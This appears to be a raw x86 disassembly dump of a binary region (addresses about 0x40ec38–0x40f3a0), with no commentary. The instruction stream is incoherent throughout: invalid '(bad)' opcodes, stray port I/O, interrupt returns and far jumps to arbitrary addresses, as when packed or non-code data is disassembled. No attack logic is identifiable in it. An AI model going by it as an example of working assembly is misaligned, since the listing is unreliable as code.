  40ec38:	xchg   ebp,eax
  40ec39:	add    edx,DWORD PTR [edi+eiz*2+0x34]
  40ec3d:	lock adc ebp,eax
  40ec40:	imul   edx,esp,0xffffff91
  40ec43:	shl    BYTE PTR [ebp-0x2c],1
  40ec46:	aas    
  40ec47:	rcr    BYTE PTR [ecx],cl
  40ec49:	sbb    DWORD PTR [esi-0x6d113fe7],ebp
  40ec4f:	mov    eax,DWORD PTR [eax+ecx*8+0x62]
  40ec53:	dec    edi
  40ec54:	call   0x85743c50
  40ec59:	mov    dh,0x39
  40ec5b:	push   esp
  40ec5c:	dec    edi
  40ec5d:	cs clc 
  40ec5f:	xchg   ebx,eax
  40ec60:	mov    esi,0xd22ed361
  40ec65:	mov    al,0xe4
  40ec67:	fst    QWORD PTR [esi-0x591fdb9e]
  40ec6d:	cmc    
  40ec6e:	push   ebp
  40ec6f:	in     al,0xbb
  40ec71:	add    al,0x4b
  40ec73:	aas    
  40ec74:	sub    DWORD PTR [ebp-0x7c],ebx
  40ec77:	add    eax,0x44ad11f2
  40ec7c:	(bad)  [ebx]
  40ec7e:	repnz pop es
  40ec80:	outs   dx,DWORD PTR ds:[esi]
  40ec81:	sbb    al,0x21
  40ec83:	pop    es
  40ec84:	scas   eax,DWORD PTR es:[edi]
  40ec85:	or     al,0x14
  40ec87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec88:	cmp    BYTE PTR [edx],0x5c
  40ec8b:	adc    eax,0xc18f8b1f
  40ec90:	mov    BYTE PTR [edi],dh
  40ec92:	imul   ebx,DWORD PTR [edx-0x6f],0x663d3079
  40ec99:	xchg   edx,eax
  40ec9a:	pop    edx
  40ec9b:	leave  
  40ec9c:	add    esi,DWORD PTR [esp+eiz*4]
  40ec9f:	jge    0x40ec69
  40eca1:	lock sar cl,1
  40eca4:	jb     0x40ec26
  40eca6:	jl     0x40ec32
  40eca8:	out    dx,eax
  40eca9:	aam    0xb4
  40ecab:	ins    BYTE PTR es:[edi],dx
  40ecac:	mov    esp,0xf7dea6e2
  40ecb1:	scas   al,BYTE PTR es:[edi]
  40ecb2:	sar    edi,cl
  40ecb4:	iret   
  40ecb5:	or     al,0xf9
  40ecb7:	rcl    DWORD PTR [edi+ecx*4-0xafebeab],cl
  40ecbe:	push   cs
  40ecbf:	jp     0x40ed14
  40ecc1:	fnstcw WORD PTR [edi-0x4a]
  40ecc4:	push   esp
  40ecc5:	mov    BYTE PTR [edx],ah
  40ecc7:	jmp    0x40ed3c
  40ecc9:	ja     0x40ec89
  40eccb:	(bad)  
  40eccc:	add    bl,BYTE PTR [ecx]
  40ecce:	iret   
  40eccf:	sti    
  40ecd0:	xchg   ecx,eax
  40ecd1:	mov    edi,0x629d1f68
  40ecd6:	xchg   esi,eax
  40ecd7:	adc    eax,0x1017ffc7
  40ecdc:	xchg   ecx,eax
  40ecdd:	jmp    0xfba5:0x8699e029
  40ece4:	cmp    al,0x1c
  40ece6:	jmp    0xed65a4ee
  40eceb:	mov    BYTE PTR [ecx+0x40d08d1e],al
  40ecf1:	push   ecx
  40ecf2:	pushf  
  40ecf3:	fsub   st(6),st
  40ecf5:	cmp    eax,0x4efc23c3
  40ecfa:	and    esi,edx
  40ecfc:	outs   dx,BYTE PTR ds:[esi]
  40ecfd:	mov    bh,0x45
  40ecff:	int    0x75
  40ed01:	int    0xd1
  40ed03:	mov    al,0xc3
  40ed05:	sub    cl,BYTE PTR [esi]
  40ed07:	inc    esp
  40ed08:	fcom   QWORD PTR [esi-0x2a829ad1]
  40ed0e:	sub    al,0x1a
  40ed10:	aaa    
  40ed11:	(bad)  
  40ed13:	xchg   esp,eax
  40ed14:	repz jp 0x40ed44
  40ed17:	jmp    0x58c1:0xfc2d5a5f
  40ed1e:	or     al,0xb2
  40ed20:	(bad)
  40ed23:	leave  
  40ed24:	ja     0x40ed0f
  40ed26:	jecxz  0x40ecdb
  40ed28:	pop    ecx
  40ed29:	icebp  
  40ed2a:	in     al,0x91
  40ed2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed2d:	call   0x45d7:0x1a4490a8
  40ed34:	stos   BYTE PTR es:[edi],al
  40ed35:	inc    ebx
  40ed36:	or     DWORD PTR [esi],edi
  40ed38:	jge    0x40ed0d
  40ed3a:	addr16 out 0xfb,al
  40ed3d:	pop    edi
  40ed3e:	in     al,dx
  40ed3f:	xor    DWORD PTR [esp+edx*4-0x475c082a],ebx
  40ed46:	jp     0x40eda3
  40ed48:	pop    eax
  40ed49:	fldcw  WORD PTR [ecx]
  40ed4b:	in     eax,dx
  40ed4c:	loope  0x40ed2b
  40ed4e:	fwait
  40ed4f:	out    dx,eax
  40ed50:	out    0xe8,eax
  40ed52:	scas   al,BYTE PTR es:[edi]
  40ed53:	mov    ch,0x2a
  40ed55:	add    eax,0xfb219399
  40ed5a:	sub    BYTE PTR [eax+0x3f],bl
  40ed5d:	mov    ds:0x2644a17b,eax
  40ed62:	jecxz  0x40edb7
  40ed64:	sbb    al,0xfe
  40ed66:	cmp    ecx,DWORD PTR [edi]
  40ed68:	sub    bh,BYTE PTR [edi]
  40ed6a:	pusha  
  40ed6b:	mov    dh,0x58
  40ed6d:	sub    DWORD PTR [esi-0x54c355d0],eax
  40ed73:	out    dx,al
  40ed74:	adc    esi,DWORD PTR [eax+0x468ca522]
  40ed7a:	and    BYTE PTR [ecx+0x7c],al
  40ed7d:	and    dl,BYTE PTR [eax]
  40ed7f:	mov    al,ds:0xba2ca1bc
  40ed84:	push   es
  40ed85:	test   al,0x84
  40ed87:	fisttp WORD PTR [eax-0x23ebaed9]
  40ed8d:	(bad)  
  40ed8e:	(bad)  
  40ed8f:	out    0x8d,eax
  40ed91:	xchg   DWORD PTR [esi],esi
  40ed93:	inc    eax
  40ed94:	push   esi
  40ed95:	push   ds
  40ed96:	and    al,0x93
  40ed98:	sar    BYTE PTR [esi-0x850eda6],1
  40ed9e:	mov    ebx,0x10a10578
  40eda3:	out    dx,eax
  40eda4:	aas    
  40eda5:	xor    DWORD PTR [ebx+0x4b2c9076],edx
  40edab:	cmp    esp,DWORD PTR [edi]
  40edad:	iret   
  40edae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edaf:	jg     0x40ed5e
  40edb1:	rcl    BYTE PTR [esi-0x1d],cl
  40edb4:	mov    edi,0xeeac7947
  40edb9:	outs   dx,DWORD PTR ds:[esi]
  40edba:	sub    eax,0x2a54a94e
  40edbf:	nop
  40edc0:	loop   0x40edf5
  40edc2:	adc    esi,DWORD PTR [ebx]
  40edc4:	mov    al,ds:0xbb3d8acd
  40edc9:	jno    0x40edba
  40edcb:	lds    edx,FWORD PTR [ecx+0x31]
  40edce:	jb     0x40ed98
  40edd0:	call   0x480f2960
  40edd5:	pop    ebp
  40edd6:	jo     0x40ee2a
  40edd8:	pop    es
  40edd9:	out    0xcc,eax
  40eddb:	jbe    0x40edf6
  40eddd:	shl    BYTE PTR [edx-0x4815f591],cl
  40ede3:	lds    edx,FWORD PTR ds:0xd16ddaa
  40ede9:	push   eax
  40edea:	stos   DWORD PTR es:[edi],eax
  40edeb:	retf   0x592a
  40edee:	push   ss
  40edef:	in     al,dx
  40edf0:	sbb    DWORD PTR ds:0x294f8ed0,edi
  40edf6:	inc    edx
  40edf7:	adc    eax,0xc6a73569
  40edfc:	fcos   
  40edfe:	pop    ebp
  40edff:	push   ecx
  40ee00:	mul    al
  40ee02:	cmp    BYTE PTR [esi],dl
  40ee04:	out    dx,al
  40ee05:	jp     0x40edc1
  40ee07:	sbb    al,0x92
  40ee09:	ins    DWORD PTR es:[edi],dx
  40ee0a:	je     0x40edc9
  40ee0c:	rcr    BYTE PTR [edi-0x24f6d279],cl
  40ee12:	jbe    0x40eddd
  40ee14:	popa   
  40ee15:	or     BYTE PTR [esi+0x1a15115c],bl
  40ee1b:	clc    
  40ee1c:	cmp    DWORD PTR [ebx-0x68],ebx
  40ee1f:	iret   
  40ee20:	popa   
  40ee21:	xchg   edi,eax
  40ee22:	and    DWORD PTR [esi],ebp
  40ee24:	inc    ecx
  40ee25:	and    al,0x84
  40ee27:	or     al,0x69
  40ee29:	enter  0xf6a6,0x29
  40ee2d:	pop    esi
  40ee2e:	pop    esi
  40ee2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee30:	mov    edi,0xedde80de
  40ee35:	cmp    al,0xed
  40ee37:	inc    eax
  40ee38:	je     0x40ee26
  40ee3a:	cmp    DWORD PTR [eax-0x1ede10d6],esi
  40ee40:	add    BYTE PTR ds:0xda886f28,al
  40ee46:	jmp    0x5a35:0x62659c6f
  40ee4d:	inc    ecx
  40ee4e:	xor    DWORD PTR [edx],0xffffff9f
  40ee51:	jnp    0x40ee34
  40ee53:	push   esi
  40ee54:	popf   
  40ee55:	add    ecx,DWORD PTR [esi+0x79]
  40ee58:	std    
  40ee59:	(bad)  
  40ee5a:	in     al,dx
  40ee5b:	fdivr  DWORD PTR [ebp+0x4]
  40ee5e:	enter  0x3269,0xe5
  40ee62:	add    DWORD PTR [eax],eax
  40ee64:	pop    es
  40ee65:	dec    ebx
  40ee66:	jno    0x40ee7c
  40ee68:	enter  0x3b1,0x8a
  40ee6c:	aam    0x88
  40ee6e:	mov    ecx,0x4d4569ab
  40ee73:	push   esi
  40ee74:	aas    
  40ee75:	dec    ecx
  40ee76:	outs   dx,DWORD PTR ds:[esi]
  40ee77:	mov    DWORD PTR [edx+ebp*2+0x60],ebx
  40ee7b:	add    DWORD PTR [ebx+0x7dc0f11d],eax
  40ee81:	or     al,0xbb
  40ee83:	imul   ebp,DWORD PTR [ecx-0x183d70c9],0x1f
  40ee8a:	sub    DWORD PTR [eax-0x53],0xdd99ad2c
  40ee91:	sub    dh,BYTE PTR [ecx-0x42]
  40ee94:	xchg   ebp,eax
  40ee95:	mov    eax,esi
  40ee97:	jbe    0x40eeef
  40ee99:	call   0xb9d401a4
  40ee9e:	push   esi
  40ee9f:	xchg   BYTE PTR [edx-0x80],dh
  40eea2:	lock sar BYTE PTR [ecx-0x6aee10b3],cl
  40eea9:	call   0x85d49141
  40eeae:	xchg   edx,eax
  40eeaf:	cwde   
  40eeb0:	test   BYTE PTR [ebx],cl
  40eeb2:	push   ebx
  40eeb3:	inc    esi
  40eeb4:	js     0x40ee74
  40eeb6:	dec    edi
  40eeb7:	(bad)  
  40eeb8:	push   ds
  40eeb9:	mov    edx,0x6a6dd067
  40eebe:	sbb    eax,0xda6f76f7
  40eec3:	lahf   
  40eec4:	xchg   edi,eax
  40eec5:	pop    esp
  40eec6:	fnop   
  40eec8:	nop
  40eec9:	pmullw mm6,mm6
  40eecc:	or     eax,0x4221366e
  40eed1:	mov    cl,0xa3
  40eed3:	jnp    0x40eec2
  40eed5:	dec    ebp
  40eed6:	int    0x1
  40eed8:	ror    dl,cl
  40eeda:	sbb    DWORD PTR [edi-0x7b],ebp
  40eedd:	inc    edx
  40eede:	outs   dx,BYTE PTR ds:[esi]
  40eedf:	ret    
  40eee0:	fnstcw WORD PTR [eax-0x49079cac]
  40eee6:	mov    ds:0x985d0b56,al
  40eeeb:	test   al,0x83
  40eeed:	scas   al,BYTE PTR es:[edi]
  40eeee:	stos   DWORD PTR es:[edi],eax
  40eeef:	adc    ebx,edi
  40eef1:	xor    al,0x76
  40eef3:	(bad)  
  40eef7:	jae    0x40eeb3
  40eef9:	cmp    eax,0x6f7a3411
  40eefe:	mov    eax,0x193788c2
  40ef03:	sub    BYTE PTR [ebx+0x4b],cl
  40ef06:	daa    
  40ef07:	mov    ebp,0xf92c6af9
  40ef0c:	je     0x40ef82
  40ef0e:	sbb    eax,0x3c3e7f98
  40ef13:	fs cs sub eax,0xee750baf
  40ef1a:	or     BYTE PTR [edi+eiz*8+0x5f],dl
  40ef1e:	jg     0x40eefd
  40ef20:	xchg   edi,eax
  40ef21:	lock test eax,0x501d704e
  40ef27:	cld    
  40ef28:	mov    ebp,0xa50fe6ba
  40ef2d:	sub    eax,0xfd297ea7
  40ef32:	sub    BYTE PTR [esi+esi*1-0x4bf6c2ba],0xa8
  40ef3a:	adc    al,0x15
  40ef3c:	ins    DWORD PTR es:[edi],dx
  40ef3d:	call   FWORD PTR [ecx+esi*8+0x4ee8b63a]
  40ef44:	ss inc ebx
  40ef46:	jle    0x40ef33
  40ef48:	jecxz  0x40eef6
  40ef4a:	sbb    ebx,DWORD PTR [eax+0x17756d40]
  40ef50:	xor    al,BYTE PTR [esi+0x7c96096e]
  40ef56:	out    0xa5,al
  40ef58:	xor    eax,0x4f0cf92a
  40ef5d:	iret   
  40ef5e:	leave  
  40ef5f:	dec    esi
  40ef60:	and    bh,ah
  40ef62:	loopne 0x40efaa
  40ef64:	or     DWORD PTR [ecx+ecx*1-0x2b],edi
  40ef68:	push   esp
  40ef69:	jbe    0x40ef81
  40ef6b:	inc    eax
  40ef6c:	arpl   bp,bx
  40ef6e:	gs shl bh,0xaf
  40ef72:	imul   edx,DWORD PTR [edx+0x5b624b51],0xc248a128
  40ef7c:	jp     0x40efd2
  40ef7e:	loope  0x40ef10
  40ef80:	add    eax,0x3594bb42
  40ef85:	sbb    BYTE PTR [ebx],ah
  40ef87:	shl    BYTE PTR [esi-0x7edced30],cl
  40ef8d:	das    
  40ef8e:	mov    bh,BYTE PTR [ebp-0x6547021c]
  40ef94:	add    DWORD PTR [edi-0x3ae0c3f4],edx
  40ef9a:	rcr    BYTE PTR [edi-0x9],cl
  40ef9d:	adc    eax,0x462d501a
  40efa2:	icebp  
  40efa3:	sbb    al,0x49
  40efa5:	aaa    
  40efa6:	xchg   edx,eax
  40efa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efa8:	push   ebx
  40efa9:	rcl    BYTE PTR [edi+0x39],cl
  40efac:	das    
  40efad:	les    esp,FWORD PTR [esi+0x4f]
  40efb0:	xor    DWORD PTR [edi+0x73201e7f],0xffffffbb
  40efb7:	in     eax,dx
  40efb8:	dec    ebp
  40efb9:	mov    fs,WORD PTR [esi+ebp*8-0x63e52a07]
  40efc0:	sbb    edi,edi
  40efc2:	into   
  40efc3:	cmp    ecx,eax
  40efc5:	fmul   st(7),st
  40efc7:	add    dl,BYTE PTR [eax-0x1b]
  40efca:	adc    al,BYTE PTR [eax]
  40efcc:	jnp    0x40eff4
  40efce:	dec    ebx
  40efcf:	imul   ebp,DWORD PTR [eax+0xfd9830],0x4fd3980f
  40efd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efda:	sbb    BYTE PTR [edi-0x32],dl
  40efdd:	mov    WORD PTR [ecx-0x57],cs
  40efe0:	dec    esi
  40efe1:	clc    
  40efe2:	sub    edi,edx
  40efe4:	out    dx,eax
  40efe5:	jp     0x40ef9a
  40efe7:	inc    esp
  40efe8:	imul   edi,DWORD PTR [edx],0x3c
  40efeb:	xor    eax,0x18105594
  40eff0:	sti    
  40eff1:	mov    ebp,0xc27fdf4a
  40eff6:	aam    0x3e
  40eff8:	inc    ebx
  40eff9:	cwde   
  40effa:	add    DWORD PTR [ebp-0x52],ebp
  40effd:	adc    dl,cl
  40efff:	mov    al,ds:0x8261bf72
  40f004:	push   ds
  40f005:	mov    ds:0xc432e0c5,eax
  40f00a:	sbb    DWORD PTR [esi+0x4abecdda],edi
  40f010:	sahf   
  40f011:	test   al,0x15
  40f013:	mov    bl,0x65
  40f015:	adc    al,BYTE PTR [ecx-0x43ab7993]
  40f01b:	cmp    DWORD PTR [edx+0x9],esp
  40f01e:	jae    0x40efd1
  40f020:	pop    DWORD PTR [eax+0x15]
  40f023:	add    ah,BYTE PTR [ecx-0x73af11cd]
  40f029:	sti    
  40f02a:	inc    eax
  40f02b:	jecxz  0x40efdc
  40f02d:	mov    bh,0x84
  40f02f:	push   ebx
  40f030:	cmp    BYTE PTR [edi+0x44],ah
  40f033:	icebp  
  40f034:	(bad)  
  40f035:	sub    al,0x71
  40f037:	test   bh,bl
  40f039:	ins    BYTE PTR es:[edi],dx
  40f03a:	in     al,dx
  40f03b:	and    ah,BYTE PTR [edx-0x61d46a4c]
  40f041:	xchg   edi,eax
  40f042:	sbb    eax,0xd8e0c107
  40f047:	push   esp
  40f048:	pop    ss
  40f049:	jmp    0xd7a3874f
  40f04e:	xor    BYTE PTR [esi+esi*1+0x4cc9ded5],ch
  40f055:	test   ecx,ebp
  40f057:	xchg   ebx,eax
  40f058:	lods   al,BYTE PTR ds:[esi]
  40f059:	push   ds
  40f05a:	jl     0x40f0b1
  40f05c:	cmc    
  40f05d:	pop    ebp
  40f05e:	pop    ss
  40f05f:	(bad)
  40f062:	dec    ebx
  40f063:	add    bl,dh
  40f065:	(bad)  
  40f066:	fiadd  DWORD PTR [edi+0x6808087a]
  40f06c:	xor    dl,ch
  40f06e:	aad    0x12
  40f070:	and    BYTE PTR [eax],ah
  40f072:	inc    ebp
  40f073:	out    0x88,al
  40f075:	sbb    DWORD PTR [esi],0xffffffb6
  40f078:	aaa    
  40f079:	(bad)  
  40f07a:	mov    ecx,0xe29b397f
  40f07f:	xchg   ecx,eax
  40f080:	xchg   esp,eax
  40f081:	xor    eax,0x48f46199
  40f086:	push   es
  40f087:	outs   dx,BYTE PTR ds:[esi]
  40f088:	push   ds
  40f089:	xor    BYTE PTR [ecx],bl
  40f08b:	pop    ss
  40f08c:	add    eax,0xaf388d02
  40f091:	sub    ah,ch
  40f093:	inc    edx
  40f094:	cmp    DWORD PTR [ebp-0x61193f46],ecx
  40f09a:	call   0x5e5a73f5
  40f09f:	pop    edx
  40f0a0:	sar    BYTE PTR [edi-0x64],0x9d
  40f0a4:	ins    BYTE PTR es:[edi],dx
  40f0a5:	dec    edx
  40f0a6:	(bad)  
  40f0a7:	test   dl,cl
  40f0a9:	(bad)  
  40f0aa:	push   edi
  40f0ab:	int3   
  40f0ac:	test   BYTE PTR [edi],cl
  40f0ae:	popa   
  40f0af:	xchg   ecx,eax
  40f0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0b1:	imul   eax,DWORD PTR [ebp-0x3e6672fb],0xe19521d
  40f0bb:	stos   BYTE PTR es:[edi],al
  40f0bc:	int    0x17
  40f0be:	add    BYTE PTR [ecx-0x2],dl
  40f0c1:	clc    
  40f0c2:	push   ds
  40f0c3:	arpl   WORD PTR fs:[esi+esi*2+0x46],di
  40f0c8:	push   0xb5205f68
  40f0cd:	or     BYTE PTR [eax],bl
  40f0cf:	clc    
  40f0d0:	cli    
  40f0d1:	arpl   di,ax
  40f0d3:	cmp    esi,eax
  40f0d5:	cwde   
  40f0d6:	cmp    al,dh
  40f0d8:	enter  0x617a,0xca
  40f0dc:	xor    al,0x54
  40f0de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0df:	adc    eax,0x394f03db
  40f0e4:	add    DWORD PTR [ecx],ebx
  40f0e6:	ss out 0xc6,eax
  40f0e9:	dec    ebx
  40f0ea:	push   cs
  40f0eb:	jns    0x40f0e1
  40f0ed:	lods   al,BYTE PTR ds:[esi]
  40f0ee:	hlt    
  40f0ef:	ins    DWORD PTR es:[edi],dx
  40f0f0:	mov    al,ds:0x7f4c716d
  40f0f5:	(bad)  
  40f0f6:	mov    ah,0xea
  40f0f8:	ret    
  40f0f9:	jo     0x40f096
  40f0fb:	and    dl,BYTE PTR [esi-0x3b]
  40f0fe:	push   ebx
  40f0ff:	sbb    BYTE PTR [ecx-0x60],0x61
  40f103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f104:	dec    ebx
  40f105:	in     al,dx
  40f106:	push   edx
  40f107:	mov    ebx,0x67483c61
  40f10c:	cmp    esp,eax
  40f10e:	push   eax
  40f10f:	push   0x5
  40f111:	sbb    BYTE PTR [esp+eax*1],bl
  40f114:	pop    eax
  40f115:	push   edx
  40f116:	in     al,0x5
  40f118:	ss mov edx,0xa30f6e48
  40f11e:	div    BYTE PTR [edx]
  40f120:	fcom   DWORD PTR [ecx+0x39]
  40f123:	pop    ecx
  40f124:	mov    bl,0x7b
  40f126:	inc    ebp
  40f127:	xor    al,0x28
  40f129:	daa    
  40f12a:	out    0x1e,al
  40f12c:	mov    al,0x81
  40f12e:	ficomp WORD PTR [edi-0x7f52ee5]
  40f134:	xchg   edx,eax
  40f135:	and    ebp,DWORD PTR [ebx+0x3def4e02]
  40f13b:	adc    bl,BYTE PTR [ebx]
  40f13d:	ss jne 0x40f141
  40f140:	mov    ecx,0x7c272aa5
  40f145:	into   
  40f146:	push   ss
  40f147:	fs jae 0x40f166
  40f14a:	out    dx,al
  40f14b:	add    BYTE PTR [edx+0x5c],ch
  40f14e:	push   ds
  40f14f:	mov    ah,0x93
  40f151:	(bad)  
  40f152:	ss sbb al,0xc6
  40f155:	xor    al,0x59
  40f157:	pop    ebp
  40f158:	and    ebx,DWORD PTR [edx+0x1ec8710c]
  40f15e:	(bad)  
  40f15f:	(bad)  
  40f161:	pop    ss
  40f162:	add    al,0x81
  40f164:	add    al,0xa9
  40f166:	push   esp
  40f167:	fs mov al,0xfa
  40f16a:	mov    ch,0x78
  40f16c:	pop    esi
  40f16d:	add    eax,0xc72c584
  40f172:	add    DWORD PTR [esi+0x1d],eax
  40f175:	xchg   ah,cl
  40f177:	jae    0x40f1f5
  40f179:	pop    ecx
  40f17a:	imul   ebx,DWORD PTR [ebx-0x3224249e],0x10
  40f181:	scas   eax,DWORD PTR es:[edi]
  40f182:	in     eax,0x3
  40f184:	pop    eax
  40f185:	(bad)  
  40f186:	mov    edx,0x5bac54e2
  40f18b:	add    eax,0x21357341
  40f190:	out    0x7f,al
  40f192:	out    0x1d,eax
  40f194:	push   esi
  40f195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f196:	leave  
  40f197:	mov    DWORD PTR [ebx-0x5ab8f7b5],0x365609e1
  40f1a1:	sbb    ch,BYTE PTR [edx]
  40f1a3:	jle    0x40f144
  40f1a5:	pop    edi
  40f1a6:	aas    
  40f1a7:	les    ebp,FWORD PTR [eax+0x3a493e07]
  40f1ad:	mov    ch,BYTE PTR [edi]
  40f1af:	mov    dh,0x76
  40f1b1:	pop    edi
  40f1b2:	ss dec edi
  40f1b4:	dec    ebp
  40f1b5:	mov    dh,0x7
  40f1b7:	bound  ebx,QWORD PTR [eax+0xe6dae06]
  40f1bd:	pop    es
  40f1be:	aaa    
  40f1bf:	push   eax
  40f1c0:	mov    al,ds:0xa7aaedce
  40f1c5:	ror    BYTE PTR [ebp+eax*4-0x58e02e3a],0x76
  40f1cd:	push   ss
  40f1ce:	push   eax
  40f1cf:	cld    
  40f1d0:	imul   edi,DWORD PTR [ecx+edi*2-0x61],0xffffffcc
  40f1d5:	ja     0x40f16b
  40f1d7:	stc    
  40f1d8:	xchg   DWORD PTR [edi-0x466247c8],ecx
  40f1de:	or     al,BYTE PTR [ecx-0x63f3dcbe]
  40f1e4:	lods   eax,DWORD PTR ds:[esi]
  40f1e5:	fldlg2 
  40f1e7:	adc    ebx,ecx
  40f1e9:	mov    dh,0x0
  40f1eb:	call   0xa5d7:0x5909a57f
  40f1f2:	inc    ebp
  40f1f3:	mov    al,0xc2
  40f1f5:	mov    ebp,0x37dbb95d
  40f1fa:	dec    esi
  40f1fb:	neg    BYTE PTR [esi-0x6]
  40f1fe:	push   es
  40f1ff:	jne    0x40f206
  40f201:	push   esi
  40f202:	ins    DWORD PTR es:[edi],dx
  40f203:	mov    esp,0x204ff3eb
  40f208:	push   cs
  40f209:	fdiv   QWORD PTR [eax+ebp*2]
  40f20c:	imul   edx,ecx,0xd11d92dc
  40f212:	jnp    0x40f235
  40f214:	sub    dl,BYTE PTR es:[edx+0x1d453757]
  40f21b:	pop    es
  40f21c:	loope  0x40f28e
  40f21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f21f:	push   es
  40f220:	fimul  WORD PTR [eax+0x22]
  40f223:	pop    edi
  40f224:	mov    dh,0x1b
  40f226:	(bad)  
  40f227:	loop   0x40f268
  40f229:	lods   al,BYTE PTR ds:[esi]
  40f22a:	inc    edx
  40f22b:	mulps  xmm2,XMMWORD PTR [edx+edi*1-0x487fecdf]
  40f233:	scas   eax,DWORD PTR es:[edi]
  40f234:	dec    edi
  40f235:	push   ebp
  40f236:	xor    BYTE PTR [ebp+0x41142f39],bh
  40f23c:	sahf   
  40f23d:	test   al,0xe2
  40f23f:	jae    0x40f27d
  40f241:	mov    bh,0x8e
  40f243:	clc    
  40f244:	jle    0x40f1e7
  40f246:	fucomi st,st(7)
  40f248:	jne    0x40f233
  40f24a:	sub    al,0xda
  40f24c:	xor    eax,0x37bdc8ae
  40f251:	popa   
  40f252:	into   
  40f253:	out    0xa1,al
  40f255:	aam    0x19
  40f257:	sbb    al,0xbe
  40f259:	iret   
  40f25a:	mov    esi,0x3b6942be
  40f25f:	cmp    BYTE PTR [ebx-0x71765966],ch
  40f265:	mov    cl,0x53
  40f267:	or     dh,BYTE PTR [edi+0x4016e2d6]
  40f26d:	retf   0x6741
  40f270:	icebp  
  40f271:	inc    ecx
  40f272:	sbb    DWORD PTR [esi],edi
  40f274:	shr    DWORD PTR [edi+ecx*1-0x32],1
  40f278:	cmp    dh,BYTE PTR [eax]
  40f27a:	int    0x60
  40f27c:	int    0x7b
  40f27e:	ret    0x6a93
  40f281:	inc    edi
  40f282:	in     al,dx
  40f283:	shl    BYTE PTR [ebx],0x0
  40f286:	xchg   ebp,eax
  40f287:	jbe    0x40f255
  40f289:	sar    DWORD PTR ds:0x5f4def19,cl
  40f28f:	and    al,0x27
  40f291:	ins    BYTE PTR es:[edi],dx
  40f292:	jmp    0x40f2b5
  40f294:	sti    
  40f295:	cmovo  edi,DWORD PTR [esi+edx*4+0x40a9e1b6]
  40f29d:	sub    al,0x1f
  40f29f:	adc    al,0x19
  40f2a1:	sbb    DWORD PTR [ecx+edi*8-0x35],0xe22698ad
  40f2a9:	gs ins BYTE PTR es:[edi],dx
  40f2ab:	aad    0x97
  40f2ad:	test   ebx,0x9d40785c
  40f2b3:	dec    edx
  40f2b4:	add    eax,0x1de7a824
  40f2b9:	mov    ecx,0x7c490392
  40f2be:	fisttp WORD PTR [edx-0x74]
  40f2c1:	fadd   st,st(4)
  40f2c3:	aad    0xb8
  40f2c5:	mov    al,ds:0x4f08d583
  40f2ca:	jnp    0x40f2fb
  40f2cc:	cwde   
  40f2cd:	stc    
  40f2ce:	xor    ebp,DWORD PTR [eax-0x75]
  40f2d1:	cmp    dh,BYTE PTR [esi+0x7b]
  40f2d4:	adc    esp,edi
  40f2d6:	cmp    BYTE PTR [ecx+0x2701fca0],0x20
  40f2dd:	sub    BYTE PTR gs:[esi],dh
  40f2e0:	xlat   BYTE PTR ds:[ebx]
  40f2e1:	cli    
  40f2e2:	fcomp  DWORD PTR [edi-0x4e]
  40f2e5:	jp     0x40f27e
  40f2e7:	inc    edi
  40f2e8:	int    0x22
  40f2ea:	outs   dx,DWORD PTR ds:[esi]
  40f2eb:	dec    ebp
  40f2ec:	ja     0x40f2f1
  40f2ee:	mov    ds:0xf9389bba,eax
  40f2f3:	cmp    eax,0xe021d264
  40f2f8:	aaa    
  40f2f9:	arpl   WORD PTR [edi],si
  40f2fb:	push   edx
  40f2fc:	daa    
  40f2fd:	cmp    eax,0x11fc295b
  40f302:	je     0x40f35a
  40f304:	mov    bl,0xc0
  40f306:	cdq    
  40f307:	retf   0x6cab
  40f30a:	ins    BYTE PTR es:[edi],dx
  40f30b:	dec    ebp
  40f30c:	popa   
  40f30d:	lods   eax,DWORD PTR ds:[esi]
  40f30e:	inc    ebp
  40f30f:	ss sbb al,0xef
  40f312:	out    dx,eax
  40f313:	unpckhps xmm0,XMMWORD PTR [edx]
  40f316:	sbb    al,0xfd
  40f318:	sti    
  40f319:	mov    bl,0x7
  40f31b:	xlat   BYTE PTR ds:[ebx]
  40f31c:	(bad)  
  40f31d:	call   0x9b8b6e5f
  40f322:	sbb    al,0x4e
  40f324:	adc    esp,DWORD PTR [edx]
  40f326:	pop    ebp
  40f327:	js     0x40f382
  40f329:	mov    esp,0x6ea41d5c
  40f32e:	dec    esi
  40f32f:	adc    al,0xf0
  40f331:	mov    ch,0x7c
  40f333:	xchg   ebp,eax
  40f334:	adc    eax,0x94e1f40f
  40f339:	add    esp,DWORD PTR [eax+0x43c7e48d]
  40f33f:	xor    ebx,ebp
  40f341:	or     eax,0x6421f0dc
  40f346:	mov    esp,DWORD PTR [ecx+0x23be0c02]
  40f34c:	mov    ebx,0xf6ba397b
  40f351:	imul   ebx,DWORD PTR [ebx-0x3bc5b855],0x2f
  40f358:	or     al,0x83
  40f35a:	in     al,0x65
  40f35c:	pop    esp
  40f35d:	mov    edi,0x4a17ab60
  40f362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f363:	(bad)  
  40f364:	push   ebx
  40f365:	lds    edx,FWORD PTR ds:0x949305f6
  40f36b:	push   esp
  40f36c:	sahf   
  40f36d:	aaa    
  40f36e:	sbb    esi,ecx
  40f370:	pop    ss
  40f371:	shr    BYTE PTR [edi],1
  40f373:	xchg   esi,eax
  40f374:	cmp    BYTE PTR cs:[ebx+0x7668131f],dl
  40f37b:	xor    dl,BYTE PTR [edi+0x8]
  40f37e:	sub    DWORD PTR [edx],0x15ca3e10
  40f384:	push   ebp
  40f385:	sub    ah,BYTE PTR [ecx+0x76]
  40f388:	rcl    DWORD PTR [ebx+eax*8],1
  40f38b:	std    
  40f38c:	mov    al,0xd0
  40f38e:	jne    0x40f342
  40f390:	pop    edi
  40f391:	cs dec esp
  40f393:	mov    esi,0xd47b1da1
  40f398:	add    eax,ebx
  40f39a:	add    ch,BYTE PTR [ebx-0x56aaf012]
  40f3a0:	js     0x40f32f
